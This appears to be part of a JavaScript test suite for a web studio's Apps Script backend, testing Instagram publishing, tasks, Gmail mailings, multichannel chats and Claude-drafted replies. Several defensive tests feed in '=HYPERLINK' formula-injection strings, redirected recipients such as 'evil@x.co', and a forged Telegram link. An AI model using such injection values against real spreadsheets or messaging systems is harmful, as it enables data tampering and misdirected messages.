  eq(st['c01-test'].status, 'scheduled'); ok(/Invalid image/.test(st['c01-test'].error)); eq(st['bad-path'].status, 'failed');
  g.ctx.publishDue(); g.ctx.publishDue(); st = g.post({ action: 'content', token: s.token }).state;
  eq(st['c01-test'].status, 'failed');
  ok(g.fetches.some(f => /sendMessage/.test(f.url) && /Не вдалося опублікувати/.test(JSON.parse(f.o.payload).text)));
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', at: new Date().toISOString() }).state.status, 'scheduled', 'retry after failure');
});
t('publishNow: публікує одразу і повертає стан', () => {
  const g = fresh(); const s = signIn(g); connected(g);
  const r = g.post({ action: 'publishNow', token: s.token, id: 'c01-test', caption: 'Новий підпис' }); ok(r.ok, JSON.stringify(r)); eq(r.state.status, 'published');
});
t('announceNewContent: Telegram, коли в manifest з’явились нові публікації', () => {
  const g = fresh(); g.props.TG_TOKEN = 't'; g.props.TG_CHAT = '1'; igWorld(g, { manifest: { items: MANIFEST.items.slice(0, 1) } });
  g.ctx.publishDue(); ok(!g.fetches.some(f => /sendMessage/.test(f.url)), 'first run must be silent');
  igWorld(g); g.cacheStore = {}; g.ctx.publishDue();
  const m = g.fetches.filter(f => /sendMessage/.test(f.url)).map(f => JSON.parse(f.o.payload).text).join('\n'); ok(/Нове на затвердження: 3/.test(m), m);
});
t('refreshInstagramToken: раз на тиждень, попереджає перед закінченням', () => {
  const g = fresh(); connected(g); g.props.TG_TOKEN = 't'; g.props.TG_CHAT = '1';
  const calls = igWorld(g); g.ctx.refreshInstagramToken(); eq(g.fetches.filter(f => /refresh_access_token/.test(f.url)).length, 1, 'only the connect refresh');
  g.clock.offset += 8 * 864e5; g.ctx.refreshInstagramToken(); eq(g.fetches.filter(f => /refresh_access_token/.test(f.url)).length, 2);
});

/* ---------- фаза 2: редагування, задачі, листи, Claude, дайджест ---------- */
t('contentUpdate edit: назва і порядок кадрів зберігаються, статус не змінюється; публікація в новому порядку', () => {
  const g = fresh(); const s = signIn(g); const calls = connected(g);
  let r = g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'edit', title: 'Нова назва', slides: '1,0' });
  ok(r.ok, JSON.stringify(r)); eq(r.state.status, ''); eq(r.state.title, 'Нова назва'); eq(r.state.slides, '1,0');
  eq(g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'edit', slides: '1,x' }).error, 'bad request');
  g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', at: new Date(Date.now() - MIN).toISOString() });
  calls.length = 0; g.ctx.publishDue();
  const kids = calls.filter(c => c.body.is_carousel_item === 'true');
  eq(kids[0].body.image_url, 'https://stackup.studio/content/ig/c01/02.jpg', 'order');
  const st = g.post({ action: 'content', token: s.token }).state['c01-test']; eq(st.status, 'published'); eq(st.title, 'Нова назва');
});
t('contentUpdate edit: приховати кадр — карусель з одного кадру стає звичайним постом', () => {
  const g = fresh(); const s = signIn(g); const calls = connected(g);
  g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'approve', slides: '1', at: new Date(Date.now() - MIN).toISOString() });
  calls.length = 0; g.ctx.publishDue();
  ok(!calls.some(c => c.body.media_type === 'CAROUSEL')); ok(calls.some(c => c.body.image_url === 'https://stackup.studio/content/ig/c01/02.jpg' && !c.body.is_carousel_item));
});
t('старий аркуш «Контент» без нових колонок дописує заголовок і не губить назву', () => {
  const g = fresh(); const s = signIn(g); connected(g);
  g.sheets['Контент'] = [['id', 'status', 'at', 'caption', 'comment', 'container', 'children', 'igId', 'permalink', 'publishedAt', 'error', 'tries', 'updated']];
  g.post({ action: 'contentUpdate', token: s.token, id: 'c01-test', op: 'edit', title: 'X' });
  eq(g.sheets['Контент'][0].length, 15); eq(g.post({ action: 'content', token: s.token }).state['c01-test'].title, 'X');
});
t('задачі: лише з сесією; створити, змінити, виконати, видалити; погані дані відхиляються', () => {
  const g = fresh(); const s = signIn(g);
  eq(g.post({ action: 'tasks' }).error, 'unauthorized'); eq(g.post({ action: 'taskSave', title: 'x' }).error, 'unauthorized');
  let r = g.post({ action: 'taskSave', token: s.token, title: '=HYPERLINK("x")', priority: 'urgent', due: '2026-12-01', lead: '261101-A7F2' });
  ok(r.ok, JSON.stringify(r)); const id = r.item.id; ok(/^t/.test(id)); eq(r.item.status, 'open');
  ok(g.sheets['Задачі'].some(row => row.some(v => v && v.text === '=HYPERLINK("x")')), 'formula must be stored as text');
  eq(g.post({ action: 'taskSave', token: s.token, title: 'a', due: '1 грудня' }).error, 'bad date');
  eq(g.post({ action: 'taskSave', token: s.token, title: '' }).error, 'bad request');
  eq(g.post({ action: 'taskSave', token: s.token, title: 'z', priority: 'mega' }).item.priority, 'normal');
  r = g.post({ action: 'taskSave', token: s.token, id, title: 'Готово', priority: 'high', status: 'done' }); eq(r.item.status, 'done'); ok(r.item.doneAt);
  eq(g.post({ action: 'taskSave', token: s.token, id: 'tnope1', title: 'x' }).error, 'not found');
  eq(g.post({ action: 'tasks', token: s.token }).items.length, 2);
  ok(g.post({ action: 'taskDelete', token: s.token, id }).ok); eq(g.post({ action: 'tasks', token: s.token }).items.length, 1);
});
t('sendMessage: без confirm не надсилає; лише на email із заявки; журнал', () => {
  const g = fresh(); const s = signIn(g); const b = seedBrief(g);
  eq(g.post({ action: 'sendMessage', token: s.token, id: b.id, subject: 'Hi', body: 'Text' }).error, 'confirm required');
  eq(g.post({ action: 'sendMessage', id: b.id, subject: 'Hi', body: 'Text', confirm: true }).error, 'unauthorized');
  eq(g.gmail.sent.length, 0);
  const r = g.post({ action: 'sendMessage', token: s.token, id: b.id, subject: 'Hi', body: 'Text', confirm: true, to: 'evil@x.co' });
  ok(r.ok, JSON.stringify(r)); eq(g.gmail.sent.length, 1); eq(g.gmail.sent[0].to, 'o@example.com');
  ok(g.sheets['Листування'].length === 2);
  eq(g.post({ action: 'sendMessage', token: s.token, id: 'nope', subject: 'Hi', body: 'T', confirm: true }).error, 'not found');
});
t('thread: шукає листи клієнта, обрізає цитати, визначає хто писав', () => {
  const g = fresh(); const s = signIn(g); const b = seedBrief(g);
  g.gmail.threads = [{ id: 'T1', messages: [{ id: 'm1', from: 'Олена <o@example.com>', date: '2026-11-20T10:00:00Z', subject: 'Сайт', body: 'Привіт!\n\nOn Mon, Lana wrote:\n> старе' }, { id: 'm2', from: 'Lana <lana@example.com>', date: '2026-11-21T10:00:00Z', subject: 'Re: Сайт', body: 'Відповідь' }] }];
  const r = g.post({ action: 'thread', token: s.token, id: b.id }); ok(r.ok, JSON.stringify(r));
  eq(r.messages.length, 2); eq(r.messages[0].text, 'Привіт!'); eq(r.messages[0].mine, false); eq(r.messages[1].mine, true);
  ok(/from:"o@example.com"/.test(g.gmail.queries[0]));
});
t('mailing: confirm обовʼязковий, персоналізація, відписані пропускаються, ліміт', () => {
  const g = fresh(); const s = signIn(g);
  const a = seedBrief(g, { name: 'Олена Коваль', company: 'Coffee Lab', email: 'o@example.com' }), b = seedBrief(g, { name: 'Ігор', email: 'i@example.com' });
  eq(g.post({ action: 'mailing', token: s.token, ids: [a.id, b.id], subject: 'Привіт, {{name}}', body: 'Для {{company}}' }).error, 'confirm required');
  ok(g.post({ action: 'optout', token: s.token, email: 'I@example.com', on: true }).ok);
  const r = g.post({ action: 'mailing', token: s.token, ids: [a.id, b.id], subject: 'Привіт, {{name}}', body: 'Для {{company}}', confirm: true });
  ok(r.ok, JSON.stringify(r)); eq(r.sent, 1); eq(g.gmail.sent[0].subject, 'Привіт, Олена'); ok(/^Для Coffee Lab/.test(g.gmail.sent[0].body)); ok(/відписатися/.test(g.gmail.sent[0].body));
  g.hooks.quota = 0; eq(g.post({ action: 'mailing', token: s.token, ids: [a.id], subject: 's', body: 'b', confirm: true }).error, 'mail quota');
  eq(g.post({ action: 'mailing', token: s.token, ids: [b.id], subject: 's', body: 'b', confirm: true }).error, 'no recipients');
  const meta = g.post({ action: 'mailMeta', token: s.token }); ok(meta.ok); eq(meta.optout[0], 'i@example.com'); ok(meta.log.length >= 1);
});
t('aiLead: без ключа — зрозуміла помилка; з ключем — запит до Claude без ключа у відповіді', () => {
  const g = fresh(); const s = signIn(g); const b = seedBrief(g);
  eq(g.post({ action: 'aiLead', token: s.token, id: b.id }).error, 'ai not configured');
  g.props.ANTHROPIC_KEY = 'sk-ant-secret-123';
  let sent = null;
  g.hooks.reply = (url, o) => { if (/anthropic/.test(url)) { sent = { url, o }; return { stop_reason: 'end_turn', content: [{ type: 'thinking', thinking: '...' }, { type: 'text', text: 'Аналіз готовий' }] }; } };
  const r = g.post({ action: 'aiLead', token: s.token, id: b.id, task: 'reply' });
  ok(r.ok, JSON.stringify(r)); eq(r.text, 'Аналіз готовий'); ok(!JSON.stringify(r).includes('sk-ant'));
  eq(sent.o.headers['x-api-key'], 'sk-ant-secret-123'); const body = JSON.parse(sent.o.payload);
  eq(body.model, 'claude-opus-5-5'); eq(body.thinking.type, 'adaptive'); ok(!('temperature' in body)); ok(!JSON.stringify(body).includes('o@example.com'), 'email must not go to the model');
  g.hooks.reply = url => /anthropic/.test(url) ? { __code: 529, type: 'error', error: { message: 'overloaded' } } : undefined;
  eq(g.post({ action: 'aiLead', token: s.token, id: b.id }).error, 'ai busy');
  g.hooks.reply = url => /anthropic/.test(url) ? { stop_reason: 'refusal', content: [] } : undefined;
  eq(g.post({ action: 'aiLead', token: s.token, id: b.id }).error, 'ai error');
  eq(g.post({ action: 'aiLead', id: b.id }).error, 'unauthorized');
});
t('dailyDigest: Telegram із задачами, затвердженням, заявками і святами; планувальник створено', () => {
  const g = fresh(); const s = signIn(g); g.props.TG_TOKEN = 't'; g.props.TG_CHAT = '1'; seedBrief(g);
  const day = new Date(Date.now() + 2 * 864e5).toISOString().slice(0, 10);
  igWorld(g); const base = g.hooks.reply;
  g.hooks.reply = (url, o) => /calendar\.json/.test(url) ? { events: [{ date: day, title: 'Тестове свято', kind: 'holiday', idea: 'Пост' }] } : base(url, o);
  g.post({ action: 'taskSave', token: s.token, title: 'Термінова справа', priority: 'urgent' });
  g.ctx.setupContent(); ok(g.triggers.some(x => x.fn === 'dailyDigest'));
  g.ctx.dailyDigest();
  const m = g.fetches.filter(f => /sendMessage/.test(f.url)).map(f => JSON.parse(f.o.payload).text).pop() || '';
  ok(/Термінова справа/.test(m), m); ok(/Чекає твого затвердження/.test(m), m); ok(/Нові заявки/.test(m), m); ok(/Тестове свято/.test(m), m); ok(/рілс/.test(m), m);
});

/* ---------- чати: Telegram, Instagram, пошта ---------- */
function tgWorld(g, updates, opt = {}) {
  g.props.TG_TOKEN = '1234567890:AAH_test-token-abcdefghijklmnopqrstuv'; g.props.TG_CHAT = '777'; g.props.TG_BOT = 'Stackup_studio_bot';
  const sent = [];
  g.hooks.reply = (url, o) => {
    if (/getUpdates/.test(url)) { const off = JSON.parse(o.payload || '{}').offset || 0; return { ok: true, result: updates.filter(u => u.update_id >= off) }; }
    if (/api\.telegram\.org.*sendMessage/.test(url)) { const b = JSON.parse(o.payload); sent.push(b); if (opt.blocked && String(b.chat_id) !== '777') return { ok: false, description: 'Forbidden: bot was blocked by the user' }; return { ok: true, result: { message_id: 900 + sent.length } }; }
    return undefined;
  };
  return sent;
}
const tgMsg = (id, chat, text, from = {}) => ({ update_id: id, message: { message_id: id, date: Math.floor(Date.now() / 1000), chat: { id: chat, type: 'private' }, from: { id: chat, first_name: 'Ірина', username: 'ira_flowers', ...from }, text } });

t('чати: новий клієнт пише боту → нова картка, повідомлення, сповіщення Лані; свої повідомлення Лани ігноруються; повтор не дублюється', () => {
  const g = fresh(); g.ctx.setupContent();
  const ups = [tgMsg(1, 555, 'Добрий день! Скільки коштує лендинг?'), tgMsg(2, 777, 'це Лана пише боту'), tgMsg(3, 555, '=HYPERLINK("x")')];
  const sent = tgWorld(g, ups);
  g.ctx.pollChannels();
  const leads = g.sheets['Заявки'].slice(1).filter(r => r[7] === 'chat');
  eq(leads.length, 1, 'one new lead'); eq(leads[0][8], 'Telegram'); eq(leads[0][6].text, '@ira_flowers'); eq(leads[0][2], 'new');
  const msgs = g.sheets['Чат'].slice(1); eq(msgs.length, 2, 'owner message ignored');
  ok(msgs[1][4] && msgs[1][4].text === '=HYPERLINK("x")', 'formula stored as text');
  eq(g.props.TG_OFFSET, '4');
  ok(sent.some(b => String(b.chat_id) === '777' && /Скільки коштує лендинг|HYPERLINK/.test(b.text)), 'Lana notified');
  ok(!sent.some(b => String(b.chat_id) === '555'), 'nothing sent to the client automatically');
  g.props.TG_OFFSET = '0'; g.ctx.pollChannels();
  eq(g.sheets['Чат'].slice(1).length, 2, 'no duplicates on re-poll');
  eq(g.sheets['Заявки'].slice(1).filter(r => r[7] === 'chat').length, 1, 'no duplicate lead');
});
t('чати: посилання «Запросити в Telegram» прив’язує чат до існуючої картки лише з правильним підписом', () => {
  const g = fresh(); g.ctx.setupContent(); const s = signIn(g); const b = seedBrief(g);
  tgWorld(g, []);
  const c = g.post({ action: 'chat', token: s.token, id: b.id });
  ok(c.ok, JSON.stringify(c)); ok(/^https:\/\/t\.me\/Stackup_studio_bot\?start=/.test(c.invite), c.invite);
  const payload = c.invite.split('start=')[1];
  tgWorld(g, [tgMsg(1, 601, '/start ' + b.id + '_AAAAAAAAAA', { username: 'fake' }), tgMsg(2, 602, '/start ' + payload, { username: 'real' })]);
  g.ctx.pollChannels();
  const peers = g.sheets['Контакти'].slice(1);
  eq(peers.find(p => p[0] === 'tg:602')[1], b.id, 'valid link → existing card');
  ok(peers.find(p => p[0] === 'tg:601')[1] !== b.id, 'forged link → new card');
  const c2 = g.post({ action: 'chat', token: s.token, id: b.id });
  eq(c2.channels.telegram, '@real'); eq(c2.invite, '');
});
t('чати: inbox і chat лише з сесією; непрочитані; chat позначає прочитаним; токени не видно', () => {
  const g = fresh(); g.ctx.setupContent(); const s = signIn(g);
  tgWorld(g, [tgMsg(1, 555, 'Привіт'), tgMsg(2, 555, 'Ви тут?')]); g.ctx.pollChannels();
  eq(g.post({ action: 'inbox' }).error, 'unauthorized'); eq(g.post({ action: 'chat', id: 'x' }).error, 'unauthorized');
  const inb = g.post({ action: 'inbox', token: s.token }); ok(inb.ok, JSON.stringify(inb));
  const id = Object.keys(inb.convs)[0]; eq(inb.convs[id].unread, 2); eq(inb.convs[id].last.text, 'Ви тут?'); ok(inb.channels.telegram.on);
  ok(!JSON.stringify(inb).includes('AAH_test'), 'no bot token'); ok(!JSON.stringify(inb).includes('LINK_SECRET'));
  const c = g.post({ action: 'chat', token: s.token, id }); eq(c.messages.length, 2); eq(c.messages[0].channel, 'telegram'); eq(c.channels.telegram, '@ira_flowers');
  eq(g.post({ action: 'inbox', token: s.token }).convs[id].unread, 0);
  eq(g.post({ action: 'chat', token: s.token, id: 'nope' }).error, 'not found');
});
t('чати: chatSend — без confirm нічого; Telegram лише тому, хто писав; без каналу — помилка; блокування бота пояснюється', () => {
  const g = fresh(); g.ctx.setupContent(); const s = signIn(g);
  let sent = tgWorld(g, [tgMsg(1, 555, 'Привіт')]); g.ctx.pollChannels();
  const id = g.sheets['Контакти'][1][1];
  eq(g.post({ action: 'chatSend', token: s.token, id, channel: 'telegram', text: 'Вітаю!' }).error, 'confirm required');
  eq(sent.filter(b => String(b.chat_id) === '555').length, 0);
  const r = g.post({ action: 'chatSend', token: s.token, id, channel: 'telegram', text: 'Вітаю!', confirm: true, chat_id: '999' });
  ok(r.ok, JSON.stringify(r)); const out = sent.filter(b => String(b.chat_id) !== '777'); eq(out.length, 1); eq(String(out[0].chat_id), '555', 'only to the linked peer');
  eq(g.sheets['Чат'].slice(1).pop()[3], 'out');
  eq(g.post({ action: 'chatSend', token: s.token, id, channel: 'instagram', text: 'x', confirm: true }).error, 'no channel');
  eq(g.post({ action: 'chatSend', token: s.token, id, channel: 'sms', text: 'x', confirm: true }).error, 'bad channel');
  eq(g.post({ action: 'chatSend', token: s.token, id, channel: 'telegram', text: '   ', confirm: true }).error, 'bad request');
  eq(g.post({ action: 'chatSend', id, channel: 'telegram', text: 'x', confirm: true }).error, 'unauthorized');
  sent = tgWorld(g, [], { blocked: true });
  ok(/^TG: Forbidden/.test(g.post({ action: 'chatSend', token: s.token, id, channel: 'telegram', text: 'Ще раз', confirm: true }).error));
});
t('чати: пошта — лист у розмові з Gmail, відповідь лише на email із заявки, новий лист клієнта стає непрочитаним', () => {
  const g = fresh(); g.ctx.setupContent(); const s = signIn(g); const b = seedBrief(g);
  g.gmail.threads.push({ id: 'T1', messages: [{ id: 'M1', from: 'Олена <o@example.com>', date: new Date().toISOString(), subject: 'Сайт', body: 'Коли зможете почати?' }] });
  g.ctx.pollChannels();
  const inb = g.post({ action: 'inbox', token: s.token }); eq(inb.convs[b.id].unread, 1); eq(inb.convs[b.id].last.channel, 'email');
  const c = g.post({ action: 'chat', token: s.token, id: b.id }); ok(c.messages.some(m => m.channel === 'email' && /почати/.test(m.text)), JSON.stringify(c.messages)); eq(c.channels.email, 'o@example.com');
  const r = g.post({ action: 'chatSend', token: s.token, id: b.id, channel: 'email', subject: 'Re: Сайт', text: 'Наступного тижня', confirm: true, to: 'evil@example.com' });
  ok(r.ok, JSON.stringify(r)); eq(g.gmail.sent.pop().to, 'o@example.com');
  g.ctx.pollChannels(); eq(g.sheets['Чат'].slice(1).filter(m => m[6] === 'gmM1').length, 1, 'no duplicate email');
});
t('чати: Instagram Direct — нові повідомлення стають розмовою, відповідь через API без токена в кабінеті', () => {
  const g = fresh(); g.ctx.setupContent(); const s = signIn(g);
  g.props.IG_TOKEN = 'IGSECRET'; g.props.IG_USER_ID = '1789'; g.props.IG_USERNAME = 'stackup.studio';
  const t0 = new Date(Date.now() - 60000).toISOString(); let posted = null;
  g.hooks.reply = (url, o) => {
    if (/\/me\/conversations/.test(url)) return { data: [{ id: 'cv1', updated_time: t0, participants: { data: [{ id: '1789', username: 'stackup.studio' }, { id: '42', username: 'nail.bar' }] }, messages: { data: [{ id: 'mm2', created_time: t0, from: { id: '1789' }, message: 'Вітаю!' }, { id: 'mm1', created_time: new Date(Date.now() - 120000).toISOString(), from: { id: '42' }, message: 'Хочу сайт' }] } }] };
    if (/\/1789\/messages/.test(url)) { posted = o; return { recipient_id: '42', message_id: 'mm3' }; }
    return undefined;
  };
  g.ctx.pollChannels();
  const lead = g.sheets['Заявки'].slice(1).find(r => r[7] === 'chat'); eq(lead[8], 'Instagram'); eq(lead[6].text, '@nail.bar');
  const id = lead[0]; const c = g.post({ action: 'chat', token: s.token, id });
  eq(c.messages.map(m => (m.mine ? '>' : '<') + m.text).join('|'), '<Хочу сайт|>Вітаю!');
  const r = g.post({ action: 'chatSend', token: s.token, id, channel: 'instagram', text: 'Що продаєте?', confirm: true });
  ok(r.ok, JSON.stringify(r)); eq(JSON.parse(posted.payload).recipient.id, '42'); eq(posted.headers.Authorization, 'Bearer IGSECRET'); ok(!JSON.stringify(r).includes('IGSECRET'));
  g.ctx.pollChannels(); eq(g.sheets['Чат'].slice(1).length, 3, 'no duplicates');
});
t('чати: Claude бачить розмову з усіх каналів, пише в стилі каналу, без email і телефону', () => {
  const g = fresh(); g.ctx.setupContent(); const s = signIn(g); g.props.ANTHROPIC_KEY = 'sk-ant-x';
  tgWorld(g, [tgMsg(1, 555, 'Потрібен магазин косметики')]); g.ctx.pollChannels();
  const id = g.sheets['Контакти'][1][1]; let body = null; const base = g.hooks.reply;
  g.hooks.reply = (url, o) => { if (/anthropic/.test(url)) { body = JSON.parse(o.payload); return { stop_reason: 'end_turn', content: [{ type: 'text', text: 'Чернетка' }] }; } return base(url, o); };
  const r = g.post({ action: 'aiLead', token: s.token, id, task: 'reply', channel: 'telegram' });
  ok(r.ok, JSON.stringify(r)); eq(r.channel, 'telegram');
  const u = body.messages[0].content; ok(/магазин косметики/.test(u), 'conversation included'); ok(/Канал: Telegram/.test(u)); ok(!/ira_flowers|555/.test(u), 'no handle or chat id');
});

for (const [m, n] of results) console.log(m, n);
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
